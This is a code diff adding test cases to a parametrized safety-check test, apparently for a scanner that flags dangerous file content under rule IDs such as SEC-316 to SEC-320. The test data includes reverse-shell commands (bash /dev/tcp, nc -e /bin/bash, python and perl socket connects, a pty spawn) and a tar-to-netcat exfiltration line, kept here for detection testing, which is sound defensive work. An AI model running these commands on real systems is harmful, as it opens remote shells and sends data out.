@@ -437,6 +437,11 @@ class TestSafetyChecks:
             ("tar -czf - dir | nc host 4444\n", "SEC-313"),
             (".hidden_backup.sh\n", "SEC-314"),
             ("photo.jpg.sh\n", "SEC-315"),
+            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", "SEC-316"),
+            ("nc 10.0.0.1 4444 -e /bin/bash\n", "SEC-317"),
+            ("python -c import socket,os; s.connect((host,port))\n", "SEC-318"),
+            ("perl -e use Socket; connect(...)\n", "SEC-319"),
+            ("python -c import pty; pty.spawn(/bin/bash)\n", "SEC-320"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
